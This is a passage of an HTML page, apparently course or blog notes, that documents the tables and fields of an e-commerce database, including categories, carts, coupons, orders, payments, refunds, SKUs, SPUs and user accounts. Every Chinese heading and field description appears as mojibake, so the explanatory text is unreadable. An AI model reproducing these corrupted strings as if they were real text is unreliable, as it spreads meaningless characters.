id="äºŒçº§åˆ†ç±»è¡¨ï¼ˆbase-category2ï¼‰"><a href="#äºŒçº§åˆ†ç±»è¡¨ï¼ˆbase-category2ï¼‰" class="headerlink" title="äºŒçº§åˆ†ç±»è¡¨ï¼ˆbase_category2ï¼‰"></a>äºŒçº§åˆ†ç±»è¡¨ï¼ˆbase_category2ï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>name</td><td>äºŒçº§åˆ†ç±»åç§°</td></tr><tr><td>category1_id</td><td>ä¸€çº§åˆ†ç±»ç¼–å·</td></tr></tbody></table><h4 id="ä¸‰çº§åˆ†ç±»è¡¨ï¼ˆbase-category3ï¼‰"><a href="#ä¸‰çº§åˆ†ç±»è¡¨ï¼ˆbase-category3ï¼‰" class="headerlink" title="ä¸‰çº§åˆ†ç±»è¡¨ï¼ˆbase_category3ï¼‰"></a>ä¸‰çº§åˆ†ç±»è¡¨ï¼ˆbase_category3ï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>name</td><td>ä¸‰çº§åˆ†ç±»åç§°</td></tr><tr><td>category2_id</td><td>äºŒçº§åˆ†ç±»ç¼–å·</td></tr></tbody></table><h4 id="å­—å…¸è¡¨ï¼ˆbase-dicï¼‰"><a href="#å­—å…¸è¡¨ï¼ˆbase-dicï¼‰" class="headerlink" title="å­—å…¸è¡¨ï¼ˆbase_dicï¼‰"></a>å­—å…¸è¡¨ï¼ˆbase_dicï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>dic_code</td><td>ç¼–å·</td></tr><tr><td>dic_name</td><td>ç¼–ç åç§°</td></tr><tr><td>parent_code</td><td>çˆ¶ç¼–å·</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¥æœŸ</td></tr><tr><td>operate_time</td><td>ä¿®æ”¹æ—¥æœŸ</td></tr></tbody></table><h4 id="çœä»½è¡¨ï¼ˆbase-provinceï¼‰"><a href="#çœä»½è¡¨ï¼ˆbase-provinceï¼‰" class="headerlink" title="çœä»½è¡¨ï¼ˆbase_provinceï¼‰"></a>çœä»½è¡¨ï¼ˆbase_provinceï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>id</td></tr><tr><td>name</td><td>çœåç§°</td></tr><tr><td>region_id</td><td>å¤§åŒºid</td></tr><tr><td>area_code</td><td>è¡Œæ”¿åŒºä½ç </td></tr><tr><td>iso_code</td><td>å›½é™…ç¼–ç </td></tr><tr><td>iso_3166_2</td><td>ISO3166ç¼–ç </td></tr></tbody></table><h4 id="åœ°åŒºè¡¨ï¼ˆbase-regionï¼‰"><a href="#åœ°åŒºè¡¨ï¼ˆbase-regionï¼‰" class="headerlink" title="åœ°åŒºè¡¨ï¼ˆbase_regionï¼‰"></a>åœ°åŒºè¡¨ï¼ˆbase_regionï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>å¤§åŒºid</td></tr><tr><td>region_name</td><td>å¤§åŒºåç§°</td></tr></tbody></table><h4 id="å“ç‰Œè¡¨ï¼ˆbase-trademarkï¼‰"><a href="#å“ç‰Œè¡¨ï¼ˆbase-trademarkï¼‰" class="headerlink" title="å“ç‰Œè¡¨ï¼ˆbase_trademarkï¼‰"></a>å“ç‰Œè¡¨ï¼ˆbase_trademarkï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>tm_name</td><td>å±æ€§å€¼</td></tr><tr><td>logo_url</td><td>å“ç‰Œlogoçš„å›¾ç‰‡è·¯å¾„</td></tr></tbody></table><h4 id="è´­ç‰©è½¦è¡¨ï¼ˆcart-infoï¼‰"><a href="#è´­ç‰©è½¦è¡¨ï¼ˆcart-infoï¼‰" class="headerlink" title="è´­ç‰©è½¦è¡¨ï¼ˆcart_infoï¼‰"></a>è´­ç‰©è½¦è¡¨ï¼ˆcart_infoï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>user_id</td><td>ç”¨æˆ·id</td></tr><tr><td>sku_id</td><td>skuid</td></tr><tr><td>cart_price</td><td>æ”¾å…¥è´­ç‰©è½¦æ—¶ä»·æ ¼</td></tr><tr><td>sku_num</td><td>æ•°é‡</td></tr><tr><td>img_url</td><td>å›¾ç‰‡æ–‡ä»¶</td></tr><tr><td>sku_name</td><td>skuåç§° (å†—ä½™)</td></tr><tr><td>is_checked</td><td></td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>operate_time</td><td>ä¿®æ”¹æ—¶é—´</td></tr><tr><td>is_ordered</td><td>æ˜¯å¦å·²ç»ä¸‹å•</td></tr><tr><td>order_time</td><td>ä¸‹å•æ—¶é—´</td></tr><tr><td>source_type</td><td>æ¥æºç±»å‹</td></tr><tr><td>source_id</td><td>æ¥æºç¼–å·</td></tr></tbody></table><h4 id="è¯„ä»·è¡¨ï¼ˆcomment-infoï¼‰"><a href="#è¯„ä»·è¡¨ï¼ˆcomment-infoï¼‰" class="headerlink" title="è¯„ä»·è¡¨ï¼ˆcomment_infoï¼‰"></a>è¯„ä»·è¡¨ï¼ˆcomment_infoï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>user_id</td><td>ç”¨æˆ·id</td></tr><tr><td>nick_name</td><td>ç”¨æˆ·æ˜µç§°</td></tr><tr><td>head_img</td><td></td></tr><tr><td>sku_id</td><td>skuid</td></tr><tr><td>spu_id</td><td>å•†å“id</td></tr><tr><td>order_id</td><td>è®¢å•ç¼–å·</td></tr><tr><td>appraise</td><td>è¯„ä»· 1 å¥½è¯„ 2 ä¸­è¯„ 3 å·®è¯„</td></tr><tr><td>comment_txt</td><td>è¯„ä»·å†…å®¹</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>operate_time</td><td>ä¿®æ”¹æ—¶é—´</td></tr></tbody></table><h4 id="ä¼˜æƒ åˆ¸ä¿¡æ¯è¡¨ï¼ˆcoupon-infoï¼‰"><a href="#ä¼˜æƒ åˆ¸ä¿¡æ¯è¡¨ï¼ˆcoupon-infoï¼‰" class="headerlink" title="ä¼˜æƒ åˆ¸ä¿¡æ¯è¡¨ï¼ˆcoupon_infoï¼‰"></a>ä¼˜æƒ åˆ¸ä¿¡æ¯è¡¨ï¼ˆcoupon_infoï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>è´­ç‰©åˆ¸ç¼–å·</td></tr><tr><td>coupon_name</td><td>è´­ç‰©åˆ¸åç§°</td></tr><tr><td>coupon_type</td><td>è´­ç‰©åˆ¸ç±»å‹ 1 ç°é‡‘åˆ¸ 2 æŠ˜æ‰£åˆ¸ 3 æ»¡å‡åˆ¸ 4 æ»¡ä»¶æ‰“æŠ˜åˆ¸</td></tr><tr><td>condition_amount</td><td>æ»¡é¢æ•°ï¼ˆ3ï¼‰</td></tr><tr><td>condition_num</td><td>æ»¡ä»¶æ•°ï¼ˆ4ï¼‰</td></tr><tr><td>activity_id</td><td>æ´»åŠ¨ç¼–å·</td></tr><tr><td>benefit_amount</td><td>å‡é‡‘é¢ï¼ˆ1 3ï¼‰</td></tr><tr><td>benefit_discount</td><td>æŠ˜æ‰£ï¼ˆ2 4ï¼‰</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>range_type</td><td>èŒƒå›´ç±»å‹ 1ã€å•†å“(spuid) 2ã€å“ç±»(ä¸‰çº§åˆ†ç±»id) 3ã€å“ç‰Œ</td></tr><tr><td>limit_num</td><td>æœ€å¤šé¢†ç”¨æ¬¡æ•°</td></tr><tr><td>taken_count</td><td>å·²é¢†ç”¨æ¬¡æ•°</td></tr><tr><td>start_time</td><td>å¯ä»¥é¢†å–çš„å¼€å§‹æ—¥æœŸ</td></tr><tr><td>end_time</td><td>å¯ä»¥é¢†å–çš„ç»“æŸæ—¥æœŸ</td></tr><tr><td>operate_time</td><td>ä¿®æ”¹æ—¶é—´</td></tr><tr><td>expire_time</td><td>è¿‡æœŸæ—¶é—´</td></tr><tr><td>range_desc</td><td>èŒƒå›´æè¿°</td></tr></tbody></table><h4 id="ä¼˜æƒ åˆ¸ä¼˜æƒ èŒƒå›´è¡¨ï¼ˆcoupon-rangeï¼‰"><a href="#ä¼˜æƒ åˆ¸ä¼˜æƒ èŒƒå›´è¡¨ï¼ˆcoupon-rangeï¼‰" class="headerlink" title="ä¼˜æƒ åˆ¸ä¼˜æƒ èŒƒå›´è¡¨ï¼ˆcoupon_rangeï¼‰"></a>ä¼˜æƒ åˆ¸ä¼˜æƒ èŒƒå›´è¡¨ï¼ˆcoupon_rangeï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>è´­ç‰©åˆ¸ç¼–å·</td></tr><tr><td>coupon_id</td><td>ä¼˜æƒ åˆ¸id</td></tr><tr><td>range_type</td><td>èŒƒå›´ç±»å‹ 1ã€å•†å“(spuid) 2ã€å“ç±»(ä¸‰çº§åˆ†ç±»id) 3ã€å“ç‰Œ</td></tr><tr><td>range_id</td><td></td></tr></tbody></table><h4 id="ä¼˜æƒ åˆ¸é¢†ç”¨è¡¨ï¼ˆcoupon-useï¼‰"><a href="#ä¼˜æƒ åˆ¸é¢†ç”¨è¡¨ï¼ˆcoupon-useï¼‰" class="headerlink" title="ä¼˜æƒ åˆ¸é¢†ç”¨è¡¨ï¼ˆcoupon_useï¼‰"></a>ä¼˜æƒ åˆ¸é¢†ç”¨è¡¨ï¼ˆcoupon_useï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>coupon_id</td><td>è´­ç‰©åˆ¸ID</td></tr><tr><td>user_id</td><td>ç”¨æˆ·ID</td></tr><tr><td>order_id</td><td>è®¢å•ID</td></tr><tr><td>coupon_status</td><td>è´­ç‰©åˆ¸çŠ¶æ€ï¼ˆ1ï¼šæœªä½¿ç”¨ 2ï¼šå·²ä½¿ç”¨ï¼‰</td></tr><tr><td>get_time</td><td>è·å–æ—¶é—´</td></tr><tr><td>using_time</td><td>ä½¿ç”¨æ—¶é—´</td></tr><tr><td>used_time</td><td>æ”¯ä»˜æ—¶é—´</td></tr><tr><td>expire_time</td><td>è¿‡æœŸæ—¶é—´</td></tr></tbody></table><h4 id="æ”¶è—è¡¨ï¼ˆfavor-infoï¼‰"><a href="#æ”¶è—è¡¨ï¼ˆfavor-infoï¼‰" class="headerlink" title="æ”¶è—è¡¨ï¼ˆfavor_infoï¼‰"></a>æ”¶è—è¡¨ï¼ˆfavor_infoï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>user_id</td><td>ç”¨æˆ·åç§°</td></tr><tr><td>sku_id</td><td>skuid</td></tr><tr><td>spu_id</td><td>å•†å“id</td></tr><tr><td>is_cancel</td><td>æ˜¯å¦å·²å–æ¶ˆ 0 æ­£å¸¸ 1 å·²å–æ¶ˆ</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>cancel_time</td><td>ä¿®æ”¹æ—¶é—´</td></tr></tbody></table><h4 id="è®¢å•æ˜ç»†è¡¨ï¼ˆorder-detailï¼‰"><a href="#è®¢å•æ˜ç»†è¡¨ï¼ˆorder-detailï¼‰" class="headerlink" title="è®¢å•æ˜ç»†è¡¨ï¼ˆorder_detailï¼‰"></a>è®¢å•æ˜ç»†è¡¨ï¼ˆorder_detailï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>order_id</td><td>è®¢å•ç¼–å·</td></tr><tr><td>sku_id</td><td>sku_id</td></tr><tr><td>sku_name</td><td>skuåç§°ï¼ˆå†—ä½™)</td></tr><tr><td>img_url</td><td>å›¾ç‰‡åç§°ï¼ˆå†—ä½™)</td></tr><tr><td>order_price</td><td>è´­ä¹°ä»·æ ¼(ä¸‹å•æ—¶skuä»·æ ¼ï¼‰</td></tr><tr><td>sku_num</td><td>è´­ä¹°ä¸ªæ•°</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>source_type</td><td>æ¥æºç±»å‹</td></tr><tr><td>source_id</td><td>æ¥æºç¼–å·</td></tr><tr><td>split_total_amount</td><td>åˆ†æ‘Šæ€»é‡‘é¢</td></tr><tr><td>split_activity_amount</td><td>åˆ†æ‘Šæ´»åŠ¨å‡å…é‡‘é¢</td></tr><tr><td>split_coupon_amount</td><td>åˆ†æ‘Šä¼˜æƒ åˆ¸å‡å…é‡‘é¢</td></tr></tbody></table><h4 id="è®¢å•æ˜ç»†æ´»åŠ¨å…³è”è¡¨ï¼ˆorder-detail-activityï¼‰"><a href="#è®¢å•æ˜ç»†æ´»åŠ¨å…³è”è¡¨ï¼ˆorder-detail-activityï¼‰" class="headerlink" title="è®¢å•æ˜ç»†æ´»åŠ¨å…³è”è¡¨ï¼ˆorder_detail_activityï¼‰"></a>è®¢å•æ˜ç»†æ´»åŠ¨å…³è”è¡¨ï¼ˆorder_detail_activityï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>order_id</td><td>è®¢å•id</td></tr><tr><td>order_detail_id</td><td>è®¢å•æ˜ç»†id</td></tr><tr><td>activity_id</td><td>æ´»åŠ¨ID</td></tr><tr><td>activity_rule_id</td><td>æ´»åŠ¨è§„åˆ™</td></tr><tr><td>sku_id</td><td>skuID</td></tr><tr><td>create_time</td><td>è·å–æ—¶é—´</td></tr></tbody></table><h4 id="è®¢å•æ˜ç»†ä¼˜æƒ åˆ¸å…³è”è¡¨ï¼ˆorder-detail-couponï¼‰"><a href="#è®¢å•æ˜ç»†ä¼˜æƒ åˆ¸å…³è”è¡¨ï¼ˆorder-detail-couponï¼‰" class="headerlink" title="è®¢å•æ˜ç»†ä¼˜æƒ åˆ¸å…³è”è¡¨ï¼ˆorder_detail_couponï¼‰"></a>è®¢å•æ˜ç»†ä¼˜æƒ åˆ¸å…³è”è¡¨ï¼ˆorder_detail_couponï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>order_id</td><td>è®¢å•id</td></tr><tr><td>order_detail_id</td><td>è®¢å•æ˜ç»†id</td></tr><tr><td>coupon_id</td><td>è´­ç‰©åˆ¸ID</td></tr><tr><td>coupon_use_id</td><td>è´­ç‰©åˆ¸é¢†ç”¨id</td></tr><tr><td>sku_id</td><td>skuID</td></tr><tr><td>create_time</td><td>è·å–æ—¶é—´</td></tr></tbody></table><h4 id="è®¢å•è¡¨-order-infoï¼‰"><a href="#è®¢å•è¡¨-order-infoï¼‰" class="headerlink" title="è®¢å•è¡¨(order_infoï¼‰"></a>è®¢å•è¡¨(order_infoï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>consignee</td><td>æ”¶è´§äºº</td></tr><tr><td>consignee_tel</td><td>æ”¶ä»¶äººç”µè¯</td></tr><tr><td>total_amount</td><td>æ€»é‡‘é¢</td></tr><tr><td>order_status</td><td>è®¢å•çŠ¶æ€</td></tr><tr><td>user_id</td><td>ç”¨æˆ·id</td></tr><tr><td>payment_way</td><td>ä»˜æ¬¾æ–¹å¼</td></tr><tr><td>delivery_address</td><td>é€è´§åœ°å€</td></tr><tr><td>order_comment</td><td>è®¢å•å¤‡æ³¨</td></tr><tr><td>out_trade_no</td><td>è®¢å•äº¤æ˜“ç¼–å·ï¼ˆç¬¬ä¸‰æ–¹æ”¯ä»˜ç”¨)</td></tr><tr><td>trade_body</td><td>è®¢å•æè¿°(ç¬¬ä¸‰æ–¹æ”¯ä»˜ç”¨)</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>operate_time</td><td>æ“ä½œæ—¶é—´</td></tr><tr><td>expire_time</td><td>å¤±æ•ˆæ—¶é—´</td></tr><tr><td>process_status</td><td>è¿›åº¦çŠ¶æ€</td></tr><tr><td>tracking_no</td><td>ç‰©æµå•ç¼–å·</td></tr><tr><td>parent_order_id</td><td>çˆ¶è®¢å•ç¼–å·</td></tr><tr><td>img_url</td><td>å›¾ç‰‡è·¯å¾„</td></tr><tr><td>province_id</td><td>åœ°åŒº</td></tr><tr><td>activity_reduce_amount</td><td>ä¿ƒé”€é‡‘é¢</td></tr><tr><td>coupon_reduce_amount</td><td>ä¼˜æƒ åˆ¸</td></tr><tr><td>original_total_amount</td><td>åŸä»·é‡‘é¢</td></tr><tr><td>freight_fee</td><td>è¿è´¹</td></tr><tr><td>freight_fee_reduce</td><td>è¿è´¹å‡å…</td></tr><tr><td>refundable_time</td><td>å¯é€€æ¬¾æ—¥æœŸï¼ˆç­¾æ”¶å30å¤©ï¼‰</td></tr></tbody></table><h4 id="é€€å•è¡¨ï¼ˆorder-refund-infoï¼‰"><a href="#é€€å•è¡¨ï¼ˆorder-refund-infoï¼‰" class="headerlink" title="é€€å•è¡¨ï¼ˆorder_refund_infoï¼‰"></a>é€€å•è¡¨ï¼ˆorder_refund_infoï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>user_id</td><td>ç”¨æˆ·id</td></tr><tr><td>order_id</td><td>è®¢å•id</td></tr><tr><td>sku_id</td><td>skuid</td></tr><tr><td>refund_type</td><td>é€€æ¬¾ç±»å‹</td></tr><tr><td>refund_num</td><td>é€€è´§ä»¶æ•°</td></tr><tr><td>refund_amount</td><td>é€€æ¬¾é‡‘é¢</td></tr><tr><td>refund_reason_type</td><td>åŸå› ç±»å‹</td></tr><tr><td>refund_reason_txt</td><td>åŸå› å†…å®¹</td></tr><tr><td>refund_status</td><td>é€€æ¬¾çŠ¶æ€ï¼ˆ0ï¼šå¾…å®¡æ‰¹ 1ï¼šå·²é€€æ¬¾ï¼‰</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr></tbody></table><h4 id="è®¢å•çŠ¶æ€æµæ°´è¡¨ï¼ˆorder-status-logï¼‰"><a href="#è®¢å•çŠ¶æ€æµæ°´è¡¨ï¼ˆorder-status-logï¼‰" class="headerlink" title="è®¢å•çŠ¶æ€æµæ°´è¡¨ï¼ˆorder_status_logï¼‰"></a>è®¢å•çŠ¶æ€æµæ°´è¡¨ï¼ˆorder_status_logï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td></td></tr><tr><td>order_id</td><td></td></tr><tr><td>order_status</td><td></td></tr><tr><td>operate_time</td><td></td></tr></tbody></table><h4 id="æ”¯ä»˜è¡¨ï¼ˆpayment-infoï¼‰"><a href="#æ”¯ä»˜è¡¨ï¼ˆpayment-infoï¼‰" class="headerlink" title="æ”¯ä»˜è¡¨ï¼ˆpayment_infoï¼‰"></a>æ”¯ä»˜è¡¨ï¼ˆpayment_infoï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>out_trade_no</td><td>å¯¹å¤–ä¸šåŠ¡ç¼–å·</td></tr><tr><td>order_id</td><td>è®¢å•ç¼–å·</td></tr><tr><td>user_id</td><td></td></tr><tr><td>payment_type</td><td>æ”¯ä»˜ç±»å‹ï¼ˆå¾®ä¿¡ æ”¯ä»˜å®ï¼‰</td></tr><tr><td>trade_no</td><td>äº¤æ˜“ç¼–å·</td></tr><tr><td>total_amount</td><td>æ”¯ä»˜é‡‘é¢</td></tr><tr><td>subject</td><td>äº¤æ˜“å†…å®¹</td></tr><tr><td>payment_status</td><td>æ”¯ä»˜çŠ¶æ€</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>callback_time</td><td>å›è°ƒæ—¶é—´</td></tr><tr><td>callback_content</td><td>å›è°ƒä¿¡æ¯</td></tr></tbody></table><h4 id="é€€æ¬¾è¡¨ï¼ˆrefund-paymentï¼‰"><a href="#é€€æ¬¾è¡¨ï¼ˆrefund-paymentï¼‰" class="headerlink" title="é€€æ¬¾è¡¨ï¼ˆrefund_paymentï¼‰"></a>é€€æ¬¾è¡¨ï¼ˆrefund_paymentï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>out_trade_no</td><td>å¯¹å¤–ä¸šåŠ¡ç¼–å·</td></tr><tr><td>order_id</td><td>è®¢å•ç¼–å·</td></tr><tr><td>sku_id</td><td></td></tr><tr><td>payment_type</td><td>æ”¯ä»˜ç±»å‹ï¼ˆå¾®ä¿¡ æ”¯ä»˜å®ï¼‰</td></tr><tr><td>trade_no</td><td>äº¤æ˜“ç¼–å·</td></tr><tr><td>total_amount</td><td>é€€æ¬¾é‡‘é¢</td></tr><tr><td>subject</td><td>äº¤æ˜“å†…å®¹</td></tr><tr><td>refund_status</td><td>é€€æ¬¾çŠ¶æ€</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>callback_time</td><td>å›è°ƒæ—¶é—´</td></tr><tr><td>callback_content</td><td>å›è°ƒä¿¡æ¯</td></tr></tbody></table><h4 id="SKUå¹³å°å±æ€§å€¼è¡¨ï¼ˆsku-attr-valueï¼‰"><a href="#SKUå¹³å°å±æ€§å€¼è¡¨ï¼ˆsku-attr-valueï¼‰" class="headerlink" title="SKUå¹³å°å±æ€§å€¼è¡¨ï¼ˆsku_attr_valueï¼‰"></a>SKUå¹³å°å±æ€§å€¼è¡¨ï¼ˆsku_attr_valueï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>attr_id</td><td>å±æ€§idï¼ˆå†—ä½™)</td></tr><tr><td>value_id</td><td>å±æ€§å€¼id</td></tr><tr><td>sku_id</td><td>skuid</td></tr><tr><td>attr_name</td><td>å±æ€§åç§°</td></tr><tr><td>value_name</td><td>å±æ€§å€¼åç§°</td></tr></tbody></table><h4 id="SKUä¿¡æ¯è¡¨ï¼ˆsku-infoï¼‰"><a href="#SKUä¿¡æ¯è¡¨ï¼ˆsku-infoï¼‰" class="headerlink" title="SKUä¿¡æ¯è¡¨ï¼ˆsku_infoï¼‰"></a>SKUä¿¡æ¯è¡¨ï¼ˆsku_infoï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>åº“å­˜id(itemID)</td></tr><tr><td>spu_id</td><td>å•†å“id</td></tr><tr><td>price</td><td>ä»·æ ¼</td></tr><tr><td>sku_name</td><td>skuåç§°</td></tr><tr><td>sku_desc</td><td>å•†å“è§„æ ¼æè¿°</td></tr><tr><td>weight</td><td>é‡é‡</td></tr><tr><td>tm_id</td><td>å“ç‰Œ(å†—ä½™)</td></tr><tr><td>category3_id</td><td>ä¸‰çº§åˆ†ç±»idï¼ˆå†—ä½™)</td></tr><tr><td>sku_default_img</td><td>é»˜è®¤æ˜¾ç¤ºå›¾ç‰‡(å†—ä½™)</td></tr><tr><td>is_sale</td><td>æ˜¯å¦é”€å”®ï¼ˆ1ï¼šæ˜¯ 0ï¼šå¦ï¼‰</td></tr><tr><td>create_time</td><td>åˆ›å»ºæ—¶é—´</td></tr></tbody></table><h4 id="SKUé”€å”®å±æ€§è¡¨ï¼ˆsku-sale-attr-valueï¼‰"><a href="#SKUé”€å”®å±æ€§è¡¨ï¼ˆsku-sale-attr-valueï¼‰" class="headerlink" title="SKUé”€å”®å±æ€§è¡¨ï¼ˆsku_sale_attr_valueï¼‰"></a>SKUé”€å”®å±æ€§è¡¨ï¼ˆsku_sale_attr_valueï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>id</td></tr><tr><td>sku_id</td><td>åº“å­˜å•å…ƒid</td></tr><tr><td>spu_id</td><td>spu_id(å†—ä½™)</td></tr><tr><td>sale_attr_value_id</td><td>é”€å”®å±æ€§å€¼id</td></tr><tr><td>sale_attr_id</td><td></td></tr><tr><td>sale_attr_name</td><td></td></tr><tr><td>sale_attr_value_name</td><td></td></tr></tbody></table><h4 id="SPUä¿¡æ¯è¡¨ï¼ˆspu-infoï¼‰"><a href="#SPUä¿¡æ¯è¡¨ï¼ˆspu-infoï¼‰" class="headerlink" title="SPUä¿¡æ¯è¡¨ï¼ˆspu_infoï¼‰"></a>SPUä¿¡æ¯è¡¨ï¼ˆspu_infoï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>å•†å“id</td></tr><tr><td>spu_name</td><td>å•†å“åç§°</td></tr><tr><td>description</td><td>å•†å“æè¿°(åå°ç®€è¿°ï¼‰</td></tr><tr><td>category3_id</td><td>ä¸‰çº§åˆ†ç±»id</td></tr><tr><td>tm_id</td><td>å“ç‰Œid</td></tr></tbody></table><h4 id="SPUé”€å”®å±æ€§è¡¨ï¼ˆspu-sale-attrï¼‰"><a href="#SPUé”€å”®å±æ€§è¡¨ï¼ˆspu-sale-attrï¼‰" class="headerlink" title="SPUé”€å”®å±æ€§è¡¨ï¼ˆspu_sale_attrï¼‰"></a>SPUé”€å”®å±æ€§è¡¨ï¼ˆspu_sale_attrï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·(ä¸šåŠ¡ä¸­æ— å…³è”)</td></tr><tr><td>spu_id</td><td>å•†å“id</td></tr><tr><td>base_sale_attr_id</td><td>é”€å”®å±æ€§id</td></tr><tr><td>sale_attr_name</td><td>é”€å”®å±æ€§åç§°(å†—ä½™)</td></tr></tbody></table><h4 id="SPUé”€å”®å±æ€§å€¼è¡¨ï¼ˆspu-sale-attr-valueï¼‰"><a href="#SPUé”€å”®å±æ€§å€¼è¡¨ï¼ˆspu-sale-attr-valueï¼‰" class="headerlink" title="SPUé”€å”®å±æ€§å€¼è¡¨ï¼ˆspu_sale_attr_valueï¼‰"></a>SPUé”€å”®å±æ€§å€¼è¡¨ï¼ˆspu_sale_attr_valueï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>é”€å”®å±æ€§å€¼ç¼–å·</td></tr><tr><td>spu_id</td><td>å•†å“id</td></tr><tr><td>base_sale_attr_id</td><td>é”€å”®å±æ€§id</td></tr><tr><td>sale_attr_value_name</td><td>é”€å”®å±æ€§å€¼åç§°</td></tr><tr><td>sale_attr_name</td><td>é”€å”®å±æ€§åç§°(å†—ä½™)</td></tr></tbody></table><h4 id="ç”¨æˆ·åœ°å€è¡¨ï¼ˆuser-addressï¼‰"><a href="#ç”¨æˆ·åœ°å€è¡¨ï¼ˆuser-addressï¼‰" class="headerlink" title="ç”¨æˆ·åœ°å€è¡¨ï¼ˆuser_addressï¼‰"></a>ç”¨æˆ·åœ°å€è¡¨ï¼ˆuser_addressï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>user_id</td><td>ç”¨æˆ·id</td></tr><tr><td>province_id</td><td>çœä»½id</td></tr><tr><td>user_address</td><td>ç”¨æˆ·åœ°å€</td></tr><tr><td>consignee</td><td>æ”¶ä»¶äºº</td></tr><tr><td>phone_num</td><td>è”ç³»æ–¹å¼</td></tr><tr><td>is_default</td><td>æ˜¯å¦æ˜¯é»˜è®¤</td></tr></tbody></table><h4 id="ç”¨æˆ·ä¿¡æ¯è¡¨ï¼ˆuser-infoï¼‰"><a href="#ç”¨æˆ·ä¿¡æ¯è¡¨ï¼ˆuser-infoï¼‰" class="headerlink" title="ç”¨æˆ·ä¿¡æ¯è¡¨ï¼ˆuser_infoï¼‰"></a>ç”¨æˆ·ä¿¡æ¯è¡¨ï¼ˆuser_infoï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µè¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>ç¼–å·</td></tr><tr><td>login_name</td><td>ç”¨æˆ·åç§°</td></tr><tr><td>nick_name</td><td>ç”¨æˆ·æ˜µç§°</td></tr><tr><td>passwd</td><td>ç”¨æˆ·å¯†ç 